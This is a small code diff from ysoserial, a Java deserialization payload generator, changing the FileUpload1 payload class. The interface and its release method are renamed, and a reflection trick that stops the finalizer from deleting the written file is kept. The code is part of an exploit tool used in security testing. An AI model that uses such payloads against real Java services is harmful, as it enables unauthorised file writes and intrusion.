@@ -43,7 +43,7 @@ import ysoserial.payloads.util.Reflections;
 } )
 @PayloadTest(harness="ysoserial.test.payloads.FileUploadTest", precondition = "isApplicableJavaVersion", flaky = "possible race condition")
 @Authors({ Authors.MBECHLER })
-public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
+public class FileUpload1 implements PostSerializeReleasable<DiskFileItem> {
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAtLeast(7);
     }
@@ -73,7 +73,7 @@ public class FileUpload1 implements ReleaseableObjectPayload<DiskFileItem> {
     }
 
 
-    public void release ( DiskFileItem obj ) throws Exception {
+    public void postSerializeRelease(DiskFileItem obj ) throws Exception {
         // otherwise the finalizer deletes the file
         DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, null);
         Reflections.setFieldValue(obj, "dfos", dfos);
